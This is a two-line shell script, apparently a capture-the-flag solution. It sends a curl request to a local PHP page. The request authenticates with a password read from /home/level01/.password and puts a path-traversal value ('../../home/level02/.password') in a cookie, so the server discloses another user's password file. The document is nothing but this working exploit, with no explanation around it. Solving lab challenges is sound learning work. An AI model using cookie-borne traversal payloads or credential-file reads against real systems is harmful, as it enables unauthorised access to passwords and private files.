#!/bin/sh
$ curl  --user level01:$(cat /home/level01/.password) --digest -b "user_details=../../home/level02/.password" localhost:8002/level02.php 